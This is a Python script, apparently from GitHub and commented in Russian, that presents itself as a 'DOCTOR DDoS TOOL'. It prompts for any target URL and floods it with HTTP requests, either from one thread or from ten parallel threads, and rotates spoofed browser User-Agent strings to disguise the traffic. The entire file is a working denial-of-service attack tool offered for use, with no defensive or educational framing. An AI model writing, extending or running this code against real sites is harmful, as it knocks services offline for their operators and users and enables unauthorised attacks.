import requests
import threading
import time
import random
import sys
import socket

# Глобальные переменные
attack_running = False
threads = []

user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15',
    'Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/115.0 Firefox/115.0'
]

def get_target():
    print("\n🎯 Введите цель для атаки:")
    print("Пример: https://example.com или http://192.168.1.1")
    target = input("Цель: ").strip()
    
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    return target

def dos_attack(target):
    """Простая DOS атака (один поток)"""
    global attack_running
    print(f"[DOS] Начинаем атаку на {target}")
    
    try:
        while attack_running:
            try:
                headers = {'User-Agent': random.choice(user_agents)}
                response = requests.get(target, headers=headers, timeout=5)
                print(f"[DOS] Отправлен запрос - Status: {response.status_code}")
            except Exception as e:
                print(f"[DOS] Ошибка: {str(e)}")
            
            time.sleep(0.1)  # 10 запросов в секунду
            
    except KeyboardInterrupt:
        print("[DOS] Атака остановлена")

def ddos_worker(target, worker_id):
    """Рабочий поток для DDOS атаки"""
    global attack_running
    print(f"[DDOS-W{worker_id}] Поток запущен")
    
    while attack_running:
        try:
            headers = {'User-Agent': random.choice(user_agents)}
            response = requests.get(target, headers=headers, timeout=3)
            print(f"[DDOS-W{worker_id}] Запрос отправлен - Status: {response.status_code}")
        except Exception as e:
            print(f"[DDOS-W{worker_id}] Ошибка: {str(e)}")
        
        time.sleep(0.05)  # 20 запросов в секунду на поток

def ddos_attack(target):
    """Многопоточная DDOS атака"""
    global attack_running, threads
    
    print(f"[DDOS] Начинаем атаку на {target}")
    print("[DDOS] Запускаем 10 потоков...")
    
    attack_running = True
    threads = []
    
    # Запускаем 10 рабочих потоков
    for i in range(10):
        thread = threading.Thread(target=ddos_worker, args=(target, i+1))
        thread.daemon = True
        threads.append(thread)
        thread.start()
    
    try:
        while attack_running:
            time.sleep(1)
    except KeyboardInterrupt:
        print("[DDOS] Останавливаем атаку...")
        attack_running = False
        for thread in threads:
            thread.join()
        print("[DDOS] Атака остановлена")

def stop_attack():
    """Остановка всех атак"""
    global attack_running, threads
    attack_running = False
    for thread in threads:
        thread.join()
    threads = []
    print("✅ Все атаки остановлены")

def show_banner():
    print("🛡️" * 20)
    print("          DOCTOR DDoS TOOL")
    print("           for iSH on GitHub")
    print("🛡️" * 20)
    print()

def main():
    global attack_running
    
    show_banner()
    
    while True:
        print("\n🔧 Выберите действие:")
        print("[1] DOS-атака (1 поток)")
        print("[2] DDOS-атака (10 потоков)")
        print("[3] Остановить все атаки")
        print("[4] Выход")
        
        choice = input("Выбор: ").strip()
        
        if choice == "1":
            target = get_target()
            attack_running = True
            dos_attack(target)
            
        elif choice == "2":
            target = get_target()
            ddos_attack(target)
            
        elif choice == "3":
            stop_attack()
            
        elif choice == "4":
            stop_attack()
            print("👋 Выход из программы...")
            sys.exit(0)
            
        else:
            print("❌ Неверный выбор!")

if __name__ == "__main__":
    # Установка зависимостей в iSH
    print("📦 Проверка зависимостей...")
    try:
        import requests
    except ImportError:
        print("❌ Установите requests: pip3 install requests")
        sys.exit(1)
    
    try:
        main()
    except KeyboardInterrupt:
        print("\n🛑 Программа прервана пользователем")
        stop_attack()
        sys.exit(0)
